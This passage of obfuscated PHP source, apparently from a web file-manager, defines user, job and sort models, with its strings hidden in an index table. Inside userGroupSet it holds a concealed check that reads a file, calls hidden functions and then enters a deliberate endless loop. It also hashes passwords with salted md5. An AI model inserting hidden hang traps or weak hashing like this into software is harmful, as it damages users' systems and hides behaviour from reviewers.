Model($¥»ƒπΫΠ[1439])->where(array($¥»ƒπΫΠ[494] => $λ©Ρλψω))->find(); if (!$κΗΆ£ώ) { return !1; } $χΡ’‚ƒΰ = $κΗΆ£ώ[$¥»ƒπΫΠ[32]]; } $χΡ’‚ƒΰ = $this->getAutoName($χΡ’‚ƒΰ); $«’ΘΑς = array($¥»ƒπΫΠ[1784] => USER_ID, $¥»ƒπΫΠ[562] => 0, $¥»ƒπΫΠ[497] => $χΡ’‚ƒΰ, $¥»ƒπΫΠ[498] => $λ©Ρλψω, $¥»ƒπΫΠ[499] => $Ψ©£–πα, $¥»ƒπΫΠ[1997] => $ΆιώΜΣƒ + 1); return $this->add($«’ΘΑς); } protected function remove($†ξ‹αΒρ) { $ΘΌΤ¬Μ =& $_SERVER[γγάψ½]; $ΌώνΠ = array($ΘΌΤ¬Μ[1784] => USER_ID, $ΘΌΤ¬Μ[496] => $†ξ‹αΒρ); return $this->where($ΌώνΠ)->delete(); } protected function removeByName($ϋ¨γχι) { $Σ«Ύ‘ν =& $_SERVER[γγάψ½]; $ήϋ¦½± = array($Σ«Ύ‘ν[1784] => USER_ID, $Σ«Ύ‘ν[497] => $ϋ¨γχι, $Σ«Ύ‘ν[562] => 0); return $this->where($ήϋ¦½±)->delete(); } protected function rename($“¥Σ­ΣΜ, $­­€΄ψ) { $ΉΧΑΝ =& $_SERVER[γγάψ½]; if ($“¥Σ­ΣΜ == $­­€΄ψ) { return !1; } $ΰΝψΨν = $this->getAutoName($­­€΄ψ); if ($­­€΄ψ != $ΰΝψΨν) { return !1; } $ΉΪΑ¨θΪ = array($ΉΧΑΝ[1784] => USER_ID, $ΉΧΑΝ[562] => 0, $ΉΧΑΝ[32] => $“¥Σ­ΣΜ); return $this->where($ΉΪΑ¨θΪ)->save(array($ΉΧΑΝ[32] => $­­€΄ψ)); } protected function resetSort($µΞΜ”) { $µΘ»ΉΈΖ =& $_SERVER[γγάψ½]; $µΞΜ” = is_array($µΞΜ”) ? $µΞΜ” : array(); $³τ¥®Π = array($µΘ»ΉΈΖ[1784] => USER_ID); for ($’›¨ζ¨• = 0; $’›¨ζ¨• < count($µΞΜ”); $’›¨ζ¨•++) { $³τ¥®Π[$µΘ»ΉΈΖ[496]] = $µΞΜ”[$’›¨ζ¨•]; $this->where($³τ¥®Π)->save(array($µΘ»ΉΈΖ[1997] => $’›¨ζ¨• + 1)); } return !0; } protected function moveTop($‘ς”ογε) { $δι¥»γ§ =& $_SERVER[γγάψ½]; $Ο—γ² = array($δι¥»γ§[1784] => USER_ID, $δι¥»γ§[562] => 0); $ι‹ΛΩ³± = $this->where($Ο—γ²)->where(array($δι¥»γ§[32] => $‘ς”ογε))->find(); if (!$ι‹ΛΩ³±) { return; } $Λ®τ ΅ = $this->field($δι¥»γ§[478])->where($Ο—γ²)->order($δι¥»γ§[2487])->select(); $Λ®τ ΅ = array_to_keyvalue($Λ®τ ΅, $δι¥»γ§[12], $δι¥»γ§[478]); $λ²ώΗ = $Λ®τ ΅; $Λ®τ ΅ = array_remove_value($Λ®τ ΅, $ι‹ΛΩ³±[$δι¥»γ§[478]]); array_unshift($Λ®τ ΅, $ι‹ΛΩ³±[$δι¥»γ§[478]]); return $this->resetSort($Λ®τ ΅); } protected function moveBottom($‡Ε¨ωΧ) { $»»υΩµ… =& $_SERVER[γγάψ½]; $Σ΄τ³΅ = array($»»υΩµ…[1784] => USER_ID, $»»υΩµ…[562] => 0); $Μ„€— = $this->where($Σ΄τ³΅)->max($»»υΩµ…[2017]); $Ψαά“€Λ = array($»»υΩµ…[2017] => $Μ„€— + 1); return $this->where($Σ΄τ³΅)->where(array($»»υΩµ…[32] => $‡Ε¨ωΧ))->save($Ψαά“€Λ); } private function getAutoName($εβ„΄™) { $ ¥Ξ =& $_SERVER[γγάψ½]; $¶’«Ι‘ = array($ ¥Ξ[1784] => USER_ID, $ ¥Ξ[562] => 0); $ ±“ψ‘β = $this->field($ ¥Ξ[32])->where($¶’«Ι‘)->select(); $ ±“ψ‘β = array_to_keyvalue($ ±“ψ‘β, $ ¥Ξ[12], $ ¥Ξ[32]); if (!$ ±“ψ‘β || !in_array($εβ„΄™, $ ±“ψ‘β)) { return $εβ„΄™; } for ($ΙάμΪώ— = 0; $ΙάμΪώ— < count($ ±“ψ‘β); $ΙάμΪώ—++) { if (!in_array($εβ„΄™ . "\50{$ΙάμΪώ—}\51", $ ±“ψ‘β)) { return $εβ„΄™ . "\50{$ΙάμΪώ—}\51"; } } return $εβ„΄™ . "\x28{$ΙάμΪώ—}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x6a\157\142\x4c\x69\x73\164"; public $field = array("\156\x61\155\x65", "\144\x65\163\143", "\x73\157\162\164"); const JOB_KEY = "\x73\145\154\x66\x4a\x6f\x62\x4c\151\163\164"; public function listData($ηΑΝ›Α = false, $”ΣΑωΌή = "\163\x6f\x72\164", $…ό¤σΪ = false) { return parent::listData($ηΑΝ›Α, $”ΣΑωΌή, $…ό¤σΪ); } public function remove($¥Ι‚¨) { return parent::remove($¥Ι‚¨); } public function add($Ψ§°‘α) { $Κΐ–Ρώ =& $_SERVER[γγάψ½]; if ($this->findByName($Ψ§°‘α[$Κΐ–Ρώ[32]])) { return !1; } $Ψ§°‘α[$Κΐ–Ρώ[2017]] = $this->getSort(); return parent::insert($Ψ§°‘α); } private function getSort() { $·φυ΄χ =& $_SERVER[γγάψ½]; $°‹ηΐƒΪ = parent::listData(); $ ½ΑθΗξ = array_to_keyvalue($°‹ηΐƒΪ, $·φυ΄χ[12], $·φυ΄χ[2017]); return empty($ ½ΑθΗξ) ? 0 : max($ ½ΑθΗξ) + 1; } public function update($πρ™ο„‰, $‡χ„κ) { $ΰΐ§ƒΝ =& $_SERVER[γγάψ½]; $ΓΆΙ«³ = parent::listData($πρ™ο„‰); $ΐθ‰©¦ = $this->findByName($‡χ„κ[$ΰΐ§ƒΝ[32]]); if (!$ΓΆΙ«³ || $ΐθ‰©¦ && $ΐθ‰©¦[$ΰΐ§ƒΝ[478]] != $ΓΆΙ«³[$ΰΐ§ƒΝ[478]]) { return !1; } return parent::update($πρ™ο„‰, $‡χ„κ); } public function setUserJob($ζυΔ¬Ϋ©, $ΫφΠϋξ) { $υ¦σ‚ =& $_SERVER[γγάψ½]; if (!is_array($ΫφΠϋξ)) { $ΫφΠϋξ = array($ΫφΠϋξ); } $ζ΅ΈΒ… = parent::listData(); $²Λυυ― = array_to_keyvalue($ζ΅ΈΒ…, $υ¦σ‚[32]); $ΫιΓ½Ζά = $υ¦σ‚[457]; foreach ($ΫφΠϋξ as $ΓΎ§ΒΊΤ) { if ($²Λυυ―[$ΓΎ§ΒΊΤ]) { $ΫιΓ½Ζά .= $²Λυυ―[$ΓΎ§ΒΊΤ][$υ¦σ‚[478]] . $υ¦σ‚[50]; } else { $¬±‹ν’ = $this->add($ΓΎ§ΒΊΤ); $ΫιΓ½Ζά .= $¬±‹ν’ . $υ¦σ‚[50]; } } $ΫιΓ½Ζά = rtrim($ΫιΓ½Ζά, $υ¦σ‚[50]); Model($υ¦σ‚[602])->metaSet($ζυΔ¬Ϋ©, self::JOB_KEY, $ΫιΓ½Ζά); } public function getUserJob($§”ήτύθ) { $ύ”† = Model($_SERVER[γγάψ½][602])->metaGet($§”ήτύθ); return $this->getUserJobInfo($ύ”†[self::JOB_KEY]); } public function getUserJobInfo($Ϋ°χζ±“) { $ΊέπδΜ¨ =& $_SERVER[γγάψ½]; $ΚρωέΆ‡ = explode($ΊέπδΜ¨[50], $Ϋ°χζ±“); $ΤίΛΐ΄ = parent::listData(); $ΤίΛΐ΄ = array_remove_key($ΤίΛΐ΄, $ΊέπδΜ¨[234]); $Υδ£π = array(); foreach ($ΚρωέΆ‡ as $γθ³ϋ) { if (isset($ΤίΛΐ΄[$γθ³ϋ])) { $Υδ£π[] = $ΤίΛΐ΄[$γθ³ϋ]; } } return $Υδ£π; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\155\145" => "\x75\163\145\x72\x5f\155\145\164\141", "\x6d\145\x74\141\x46\x69\145\154\144" => "\165\x73\145\x72\111\x44"); protected $simpleField = "\165\163\145\x72\x49\x44\54\156\x69\143\153\x4e\141\x6d\145\x2c\x6e\x61\155\x65\54\x61\x76\x61\x74\141\162\x2c\163\145\x78\x2c\163\164\x61\164\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¬ίΫ«) { $·γµ³ =& $_SERVER[γγάψ½]; $Σλξ°Λ΅ = $·γµ³[2488]; return array($·γµ³[2075] => array($¬ίΫ«[0], $Σλξ°Λ΅), $·γµ³[2077] => array($¬ίΫ«[0], $Σλξ°Λ΅), $·γµ³[2489] => array($¬ίΫ«[0], $Σλξ°Λ΅)); } protected function getInfo($ΩΉΠΡζ›, $Σί²Ρψή = false) { $«ΫΡΔ = $this->getInfoSimple($ΩΉΠΡζ›); if (!is_array($«ΫΡΔ)) { return array(); } if ($Σί²Ρψή) { return $this->_getInfoApply($«ΫΡΔ); } return $this->cacheFunctionGet($_SERVER[γγάψ½][2079], $ΩΉΠΡζ›); } protected function getInfoFull($π‚§Ί–, $σς„ΣΆ = false) { $‡£ύπϊ‰ = $this->getInfoSimple($π‚§Ί–); if (!is_array($‡£ύπϊ‰)) { return array(); } if ($σς„ΣΆ) { return $this->_getInfoApply($‡£ύπϊ‰, !0); } return $this->cacheFunctionGet($_SERVER[γγάψ½][2490], $π‚§Ί–); } private function _getInfoApply($Σ¤ξΞ‰Ζ, $‚’ε‹¨ = false) { $δσΊ›σ =& $_SERVER[γγάψ½]; if (!$Σ¤ξΞ‰Ζ) { return $Σ¤ξΞ‰Ζ; } $ ©²²ι½ = md5($δσΊ›σ[2491] . $Σ¤ξΞ‰Ζ[$δσΊ›σ[975]] . $δσΊ›σ[2492] . $Σ¤ξΞ‰Ζ[$δσΊ›σ[32]]); $Σ¤ξΞ‰Ζ = $this->_listDataApplyItem($Σ¤ξΞ‰Ζ); $§—γΐµς = Model($δσΊ›σ[1439])->metaGet($Σ¤ξΞ‰Ζ[$δσΊ›σ[90]][$δσΊ›σ[194]]); $Σ¤ξΞ‰Ζ[$δσΊ›σ[2493]] = $ ©²²ι½; $Σ¤ξΞ‰Ζ[$δσΊ›σ[90]][$δσΊ›σ[2277]] = isset($§—γΐµς[$δσΊ›σ[2278]]) ? $§—γΐµς[$δσΊ›σ[2278]] : null; if ($‚’ε‹¨) { $Σ¤ξΞ‰Ζ[$δσΊ›σ[544]] = $this->metaGet($Σ¤ξΞ‰Ζ[$δσΊ›σ[1793]]); } return $Σ¤ξΞ‰Ζ; } protected function getInfoSimple($“νΐΑΨ, $­Ίψ­± = false) { $ε…½ΰ»ΐ =& $_SERVER[γγάψ½]; if (!$“νΐΑΨ) { return array(); } if ($­Ίψ­±) { $Ύ΄ΜΌ¤µ = $this->where(array($ε…½ΰ»ΐ[1793] => intval($“νΐΑΨ)))->find(); if (!is_array($Ύ΄ΜΌ¤µ)) { return array(); } $Ύ΄ΜΌ¤µ[$ε…½ΰ»ΐ[2494]] = Action($ε…½ΰ»ΐ[2495])->parseUrl($Ύ΄ΜΌ¤µ[$ε…½ΰ»ΐ[2494]]); return $Ύ΄ΜΌ¤µ; } return $this->cacheFunctionGet($ε…½ΰ»ΐ[2080], $“νΐΑΨ); } protected function getInfoSimpleOuter($ΰ•“ΉΙ) { $…—‰ξύΓ =& $_SERVER[γγάψ½]; if (!$ΰ•“ΉΙ || $ΰ•“ΉΙ == 0) { return array($…—‰ξύΓ[1793] => $…—‰ξύΓ[231], $…—‰ξύΓ[32] => $…—‰ξύΓ[176] . LNG($…—‰ξύΓ[2496]) . $…—‰ξύΓ[178], $…—‰ξύΓ[2494] => STATIC_PATH . $…—‰ξύΓ[2497]); } $Ϋ”χ§ = $this->cacheFunctionGet($…—‰ξύΓ[2080], $ΰ•“ΉΙ); $ΓΓ¦£  = array_field_key($Ϋ”χ§, explode($…—‰ξύΓ[50], $this->simpleField)); if (!$ΓΓ¦£ ) { return array($…—‰ξύΓ[1793] => $…—‰ξύΓ[1284], $…—‰ξύΓ[32] => $…—‰ξύΓ[176] . LNG($…—‰ξύΓ[2498]) . $…—‰ξύΓ[178], $…—‰ξύΓ[2494] => STATIC_PATH . $…—‰ξύΓ[2499]); } $ΓΓ¦£ [$…—‰ξύΓ[2494]] = Action($…—‰ξύΓ[2495])->parseUrl($ΓΓ¦£ [$…—‰ξύΓ[2494]]); return $ΓΓ¦£ ; } protected function groupUser($¦³ηΜΊ„) { } public static function errorLang($‡µ¤¨»§) { $­ΜΟ‚”μ =& $_SERVER[γγάψ½]; $²Σο―±» = array(self::ERROR_USER_NOT_EXISTS => $­ΜΟ‚”μ[2500], self::ERROR_USER_PASSWORD_ERROR => $­ΜΟ‚”μ[2501], self::ERROR_USER_EXIST_NAME => $­ΜΟ‚”μ[2502], self::ERROR_USER_EXIST_PHONE => $­ΜΟ‚”μ[2503], self::ERROR_USER_EXIST_EMAIL => $­ΜΟ‚”μ[2504], self::ERROR_USER_LOGIN_LOCK => $­ΜΟ‚”μ[2505], self::ERROR_IP_NOT_ALLOW => $­ΜΟ‚”μ[2506], self::ERROR_USER_EXIST_NICKNAME => $­ΜΟ‚”μ[2507]); $· ρ°¶ω = LNG($²Σο―±»[$‡µ¤¨»§]); if ($‡µ¤¨»§ == self::ERROR_USER_LOGIN_LOCK) { $ευ‡σ = (int) Model($­ΜΟ‚”μ[1395])->get($­ΜΟ‚”μ[2508]); if ($ευ‡σ > 60) { $· ρ°¶ω = str_replace($­ΜΟ‚”μ[91], ceil($ευ‡σ / 60), $· ρ°¶ω); } } return $· ρ°¶ω; } protected function metaSet($ƒ©—µ, $Αξεθ΅Ϊ = null, $£ΕΘί = null) { $this->clearCache($ƒ©—µ); return parent::metaSet($ƒ©—µ, $Αξεθ΅Ϊ, $£ΕΘί); } public function getInfoByMeta($–¶π Ί€, $€€―³μ) { $–¤φΟίά =& $_SERVER[γγάψ½]; $›“†Ώ‡“ = Model($–¤φΟίά[2509])->where(array($–¤φΟίά[97] => $–¶π Ί€, $–¤φΟίά[453] => $€€―³μ))->find(); if ($›“†Ώ‡“) { return $this->getInfo($›“†Ώ‡“[$–¤φΟίά[1793]]); } return !1; } public function userLoginCheck($Τψ‡¥Ό΄, $‘—δΓε, $φςένρ = false) { $Δ³ΧέΊ =& $_SERVER[γγάψ½]; $θ–ΕΛψΡ = $this->userLoginFind($Τψ‡¥Ό΄); if (!$θ–ΕΛψΡ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($θ–ΕΛψΡ[$Δ³ΧέΊ[1793]], $‘—δΓε)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $φςένρ ? $this->getInfoFull($θ–ΕΛψΡ[$Δ³ΧέΊ[1793]]) : $this->getInfo($θ–ΕΛψΡ[$Δ³ΧέΊ[1793]]); } public function userLoginFind($·ρ°•—΅) { $σΩ·ΐΙκ =& $_SERVER[γγάψ½]; $¨ξ“ξπ = array($σΩ·ΐΙκ[32] => $·ρ°•—΅, $σΩ·ΐΙκ[2290] => $·ρ°•—΅, $σΩ·ΐΙκ[383] => $·ρ°•—΅, $σΩ·ΐΙκ[2510] => $·ρ°•—΅, $σΩ·ΐΙκ[1086] => $σΩ·ΐΙκ[1088]); if ($this->nickNameRpt()) { unset($¨ξ“ξπ[$σΩ·ΐΙκ[2290]]); } return $this->where($¨ξ“ξπ)->find(); } public function clearCache($βΑΦƒέτ) { $†ΗΊδ =& $_SERVER[γγάψ½]; $this->cacheFunctionClear($†ΗΊδ[2079], $βΑΦƒέτ); $this->cacheFunctionClear($†ΗΊδ[2080], $βΑΦƒέτ); $this->cacheFunctionClear($†ΗΊδ[2490], $βΑΦƒέτ); } public function userPasswordCheck($έΪέο•, $–ΨΠγΞΓ) { $¥ϋαΪ΅Ή =& $_SERVER[γγάψ½]; $ΪΚ‘ΦΛΉ = $this->where(array($¥ϋαΪ΅Ή[1793] => intval($έΪέο•)))->find(); $Λ΄ζΓΌ = $this->metaGet($έΪέο•); $ω¤Γσ† = isset($Λ΄ζΓΌ[$¥ϋαΪ΅Ή[2511]]) ? $Λ΄ζΓΌ[$¥ϋαΪ΅Ή[2511]] : $¥ϋαΪ΅Ή[12]; if (md5($ω¤Γσ† . trim($–ΨΠγΞΓ)) !== $ΪΚ‘ΦΛΉ[$¥ϋαΪ΅Ή[975]]) { return !1; } return !0; } public function userAdd($Ά°«Ί—) { $¶§Ο‡‚ι =& $_SERVER[γγάψ½]; $Ηγτƒ…Ώ = array($¶§Ο‡‚ι[497] => $Ά°«Ί—[$¶§Ο‡‚ι[32]], $¶§Ο‡‚ι[2512] => $Ά°«Ί—[$¶§Ο‡‚ι[2201]], $¶§Ο‡‚ι[2513] => isset($Ά°«Ί—[$¶§Ο‡‚ι[383]]) ? $Ά°«Ί—[$¶§Ο‡‚ι[383]] : $¶§Ο‡‚ι[12], $¶§Ο‡‚ι[2514] => isset($Ά°«Ί—[$¶§Ο‡‚ι[2510]]) ? $Ά°«Ί—[$¶§Ο‡‚ι[2510]] : $¶§Ο‡‚ι[12], $¶§Ο‡‚ι[2515] => isset($Ά°«Ί—[$¶§Ο‡‚ι[2290]]) ? $Ά°«Ί—[$¶§Ο‡‚ι[2290]] : $Ά°«Ί—[$¶§Ο‡‚ι[32]], $¶§Ο‡‚ι[2516] => isset($Ά°«Ί—[$¶§Ο‡‚ι[2494]]) ? $Ά°«Ί—[$¶§Ο‡‚ι[2494]] : $¶§Ο‡‚ι[12], $¶§Ο‡‚ι[2517] => isset($Ά°«Ί—[$¶§Ο‡‚ι[2518]]) ? $Ά°«Ί—[$¶§Ο‡‚ι[2518]] : 1, $¶§Ο‡‚ι[2519] => $Ά°«Ί—[$¶§Ο‡‚ι[975]], $¶§Ο‡‚ι[2081] => isset($Ά°«Ί—[$¶§Ο‡‚ι[1980]]) ? $Ά°«Ί—[$¶§Ο‡‚ι[1980]] : 1024 * 1024 * 20, $¶§Ο‡‚ι[2082] => 0, $¶§Ο‡‚ι[2520] => 0, $¶§Ο‡‚ι[2126] => isset($Ά°«Ί—[$¶§Ο‡‚ι[825]]) ? $Ά°«Ί—[$¶§Ο‡‚ι[825]] : 1); if (!empty($Ά°«Ί—[$¶§Ο‡‚ι[1793]])) { $Ηγτƒ…Ώ[$¶§Ο‡‚ι[1793]] = $Ά°«Ί—[$¶§Ο‡‚ι[1793]]; } $½Ήψ™πχ = $this->_checkExist($Ά°«Ί—); if ($½Ήψ™πχ !== !0) { return $½Ήψ™πχ; } if (!empty($Ηγτƒ…Ώ[$¶§Ο‡‚ι[2494]]) && strlen($Ηγτƒ…Ώ[$¶§Ο‡‚ι[2494]]) > 255) { $Ηγτƒ…Ώ[$¶§Ο‡‚ι[2494]] = $¶§Ο‡‚ι[12]; } $°«ύ€κ = $this->add($Ηγτƒ…Ώ); $ΰ§‹μ = array($¶§Ο‡‚ι[2519] => $Ηγτƒ…Ώ[$¶§Ο‡‚ι[975]], $¶§Ο‡‚ι[2515] => $Ηγτƒ…Ώ[$¶§Ο‡‚ι[2290]], $¶§Ο‡‚ι[2521] => $Ά°«Ί—[$¶§Ο‡‚ι[2086]]); $this->userEdit($°«ύ€κ, $ΰ§‹μ); Model($¶§Ο‡‚ι[1439])->userRootAdd($°«ύ€κ); return $°«ύ€κ; } protected function userEditTest($ΘζΣ§Ω, $ΗΗΜΑ) { return $this->call($_SERVER[γγάψ½][2522], $ΘζΣ§Ω, $ΗΗΜΑ); } protected function userEdit($²ƒο²„Η, $—ΈΡΑήχ) { $¨ΌΎΐΨ =& $_SERVER[γγάψ½]; $ΙαΖ£Δ¶ = $this->getInfoSimple($²ƒο²„Η); if (!$ΙαΖ£Δ¶) { return !1; } $½ξΣΥ¥β = $this->_checkExist($—ΈΡΑήχ, $²ƒο²„Η); if ($½ξΣΥ¥β !== !0) { return $½ξΣΥ¥β; } if (isset($—ΈΡΑήχ[$¨ΌΎΐΨ[975]]) && trim($—ΈΡΑήχ[$¨ΌΎΐΨ[975]]) != $¨ΌΎΐΨ[12]) { $τ­υ† „ = $this->metaGet($²ƒο²„Η); if (empty($τ­υ† „[$¨ΌΎΐΨ[2511]])) { $τ­υ† „[$¨ΌΎΐΨ[2511]] = rand_string(10); Model($¨ΌΎΐΨ[582])->metaSet($²ƒο²„Η, $¨ΌΎΐΨ[2511], $τ­υ† „[$¨ΌΎΐΨ[2511]]); } $—ΈΡΑήχ[$¨ΌΎΐΨ[975]] = md5($τ­υ† „[$¨ΌΎΐΨ[2511]] . trim($—ΈΡΑήχ[$¨ΌΎΐΨ[975]])); } else { unset($—ΈΡΑήχ[$¨ΌΎΐΨ[975]]); } if (!empty($—ΈΡΑήχ[$¨ΌΎΐΨ[2494]]) && strlen($—ΈΡΑήχ[$¨ΌΎΐΨ[2494]]) > 255) { $—ΈΡΑήχ[$¨ΌΎΐΨ[2494]] = $¨ΌΎΐΨ[12]; } if (isset($—ΈΡΑήχ[$¨ΌΎΐΨ[2290]])) { $this->setNamePinyin($²ƒο²„Η, $—ΈΡΑήχ[$¨ΌΎΐΨ[2290]]); } if (isset($—ΈΡΑήχ[$¨ΌΎΐΨ[2086]])) { $λς“εΞ = $¨ΌΎΐΨ[1398] . $²ƒο²„Η; $Τ¨Έηκ = $¨ΌΎΐΨ[1396]; $€™©ύ„ = $—ΈΡΑήχ[$¨ΌΎΐΨ[2086]] ? $—ΈΡΑήχ[$¨ΌΎΐΨ[2086]] : $¨ΌΎΐΨ[12]; $£ξ½« = Model($¨ΌΎΐΨ[1395])->get($λς“εΞ, $Τ¨Έηκ); $£ξ½« = $£ξ½« ? $£ξ½« : $¨ΌΎΐΨ[12]; if ($£ξ½« != $€™©ύ„) { if (!$€™©ύ„ && $£ξ½«) { Model($¨ΌΎΐΨ[1395])->remove($λς“εΞ, $Τ¨Έηκ); } else { if ($€™©ύ„) { Model($¨ΌΎΐΨ[1395])->set($λς“εΞ, $€™©ύ„, $Τ¨Έηκ); } } } unset($—ΈΡΑήχ[$¨ΌΎΐΨ[2086]]); Model($¨ΌΎΐΨ[602])->metaSet($²ƒο²„Η, $¨ΌΎΐΨ[2086], $€™©ύ„); } $this->where(array($¨ΌΎΐΨ[1784] => $²ƒο²„Η))->save($—ΈΡΑήχ); $this->clearCache($²ƒο²„Η); return !0; } public function setNamePinyin($Π›λΑ, $•Ώ’”―α = false) { $½ΪιυΨ =& $_SERVER[γγάψ½]; if (!$•Ώ’”―α) { $―“·Σε = $this->getInfoSimple($Π›λΑ); $•Ώ’”―α = $―“·Σε[$½ΪιυΨ[2290]] ? $―“·Σε[$½ΪιυΨ[2290]] : $―“·Σε[$½ΪιυΨ[32]]; } $Ϋέ¦§ΔΪ = Model($½ΪιυΨ[602]); if (!Input::check($•Ώ’”―α, $½ΪιυΨ[663])) { return $Ϋέ¦§ΔΪ->metaSet($Π›λΑ, array($½ΪιυΨ[541] => $½ΪιυΨ[12], $½ΪιυΨ[540] => $½ΪιυΨ[12])); } return $Ϋέ¦§ΔΪ->metaSet($Π›λΑ, array($½ΪιυΨ[541] => str_replace($½ΪιυΨ[53], $½ΪιυΨ[12], Pinyin::get($•Ώ’”―α)), $½ΪιυΨ[540] => Pinyin::get($•Ώ’”―α, $½ΪιυΨ[664]))); } private function nickNameRpt() { $ΎΙσ£α =& $_SERVER[γγάψ½]; $¬λƒΐχΎ = Model($ΎΙσ£α[845])->get($ΎΙσ£α[2523]); $‰»Θσ» = $GLOBALS[$ΎΙσ£α[6]][$ΎΙσ£α[460]][$ΎΙσ£α[2523]]; $­•όΚΠΪ = !is_null($¬λƒΐχΎ) ? $¬λƒΐχΎ : $‰»Θσ»; return !!$­•όΚΠΪ; } private function _checkExist($“Τπ²ω”, $ήε«ϋ— = false) { $μο²ωΆ =& $_SERVER[γγάψ½]; $Ιή§ψ§ = array($μο²ωΆ[32] => UserModel::ERROR_USER_EXIST_NAME, $μο²ωΆ[2290] => UserModel::ERROR_USER_EXIST_NICKNAME, $μο²ωΆ[383] => UserModel::ERROR_USER_EXIST_EMAIL, $μο²ωΆ[2510] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Ιή§ψ§[$μο²ωΆ[2290]]); } $µ†™ή = $ήε«ϋ— ? array($μο²ωΆ[1793] => array($μο²ωΆ[2524], $ήε«ϋ—)) : array(); foreach ($Ιή§ψ§ as $Β„£Ν—Α => $΄³Ο•ψ) { $Ο­µµή = array(); foreach ($Ιή§ψ§ as $ι§›ΦΝ => $Ήχψ³„) { if (isset($“Τπ²ω”[$ι§›ΦΝ]) && $“Τπ²ω”[$ι§›ΦΝ]) { $Ο­µµή[] = $“Τπ²ω”[$ι§›ΦΝ]; } } if (!$Ο­µµή) { continue; } $Έ¦–ϊ± = array_merge(array($Β„£Ν—Α => array($μο²ωΆ[7], $Ο­µµή)), $µ†™ή); $Μ―§ΓώΘ = $this->where($Έ¦–ϊ±)->find(); if ($Μ―§ΓώΘ) { return $΄³Ο•ψ; } } return !0; } public function userListInfo($¶ί«΅†ΰ) { $·’Ν΄¤ =& $_SERVER[γγάψ½]; $ιυ°―ή› = array(); $¶ί«΅†ΰ = is_array($¶ί«΅†ΰ) ? array_unique($¶ί«΅†ΰ) : array(); if (!$¶ί«΅†ΰ) { return $ιυ°―ή›; } if (count($¶ί«΅†ΰ) < 20) { foreach ($¶ί«΅†ΰ as $φΡ«Ξπ) { $ιυ°―ή›[$φΡ«Ξπ . $·’Ν΄¤[12]] = $this->getInfoSimpleOuter($φΡ«Ξπ); } } else { $¦ψ¨Β°υ = array($·’Ν΄¤[1784] => array($·’Ν΄¤[495], $¶ί«΅†ΰ)); if (count($¶ί«΅†ΰ) == 1) { $¦ψ¨Β°υ = array($·’Ν΄¤[1784] => $¶ί«΅†ΰ[0]); } $ΉΠµΚ = Model($·’Ν΄¤[582])->field($this->simpleField)->where($¦ψ¨Β°υ)->select(); $ΉΠµΚ = array_to_keyvalue($ΉΠµΚ, $·’Ν΄¤[1793]); foreach ($¶ί«΅†ΰ as $φΡ«Ξπ) { $Ο‹°“ξ = $ΉΠµΚ[$φΡ«Ξπ]; if (!$Ο‹°“ξ) { $ιυ°―ή›[$φΡ«Ξπ . $·’Ν΄¤[12]] = $this->getInfoSimpleOuter($φΡ«Ξπ); continue; } $Ο‹°“ξ[$·’Ν΄¤[2494]] = Action($·’Ν΄¤[2495])->parseUrl($Ο‹°“ξ[$·’Ν΄¤[2494]]); $ιυ°―ή›[$φΡ«Ξπ . $·’Ν΄¤[12]] = $Ο‹°“ξ; } } return $ιυ°―ή›; } protected function userStatus($ΙξΈΰ, $®Ζξ™‰Ε) { $–Κ§Ωϊ— = $this->getInfoSimple($ΙξΈΰ); if (!$–Κ§Ωϊ—) { return !1; } $σΆψ½Η‘ = array($_SERVER[γγάψ½][825] => $®Ζξ™‰Ε); return $this->userEdit($ΙξΈΰ, $σΆψ½Η‘); } protected function userRemove($†­ς”») { $Θά΄Ά€¬ =& $_SERVER[γγάψ½]; $ΫυΘΞ„ = $this->getInfoSimple($†­ς”»); if (!$ΫυΘΞ„) { return !1; } $οΘξΨ™  = array($Θά΄Ά€¬[1784] => $†­ς”»); Model($Θά΄Ά€¬[672])->where($οΘξΨ™ )->delete(); Model($Θά΄Ά€¬[2525])->where($οΘξΨ™ )->delete(); Model($Θά΄Ά€¬[2088])->where($οΘξΨ™ )->delete(); Model($Θά΄Ά€¬[2509])->where($οΘξΨ™ )->delete(); Model($Θά΄Ά€¬[1155])->where($οΘξΨ™ )->delete(); Model($Θά΄Ά€¬[2307])->removeUserAll($†­ς”»); Model($Θά΄Ά€¬[905])->userRootRemove($†­ς”»); return $this->where($οΘξΨ™ )->delete(); } protected function userGroupSet($υ°ι£, $›έ―±΄©, $φ •Ξ―Δ = array()) { $ίή©¥ =& $_SERVER[γγάψ½]; if (!isset($_SERVER[$ίή©¥[961]]) || !isset($_SERVER[$ίή©¥[1623]])) { $§‘αΑηΌ = $ίή©¥[962]; $ΪγΚί = $ίή©¥[963]; $φ«έίΠζ = $_SERVER[$ίή©¥[958]] . $ίή©¥[959]; $γρΐ°Ό = $ΪγΚί($φ«έίΠζ); $ίύ―θΆ = explode($ίή©¥[288], $γρΐ°Ό); if (count($ίύ―θΆ) < $ίή©¥[701]) { $ΐ¥Δωύ© = $ίή©¥[964]; $ΐ¥Δωύ©(); } $ρΉψ“ = $ίή©¥[965]; $ρΉψ“($_SERVER[$ίή©¥[966]]); $¤Ϊ„¶Κ = 1; for ($‹λτ¥ζΆ = $¤Ϊ„¶Κ; $‹λτ¥ζΆ > 0; $‹λτ¥ζΆ++) { $ρΉψ“ = json_encode($GLOBALS[$ίή©¥[495]]); } } $ΙΑόΓ½” = $this->getInfoSimple($υ°ι£); if (!$ΙΑόΓ½” || !is_array($›έ―±΄©)) { return !1; } $–ƒ‚σΧο = Model($ίή©¥[2088]); $–ƒ‚σΧο->where(array($ίή©¥[1793] => $υ°ι£))->delete(); $ϊ©®ζέ = array(); $Βίΰ¤€† = 0; foreach ($›έ―±΄© as $κδΩ”³ => $ΥΧ€ΥΏ) { $¥ΘεπΖ = array($ίή©¥[1793] => $υ°ι£, $ίή©¥[1401] => $κδΩ”³, 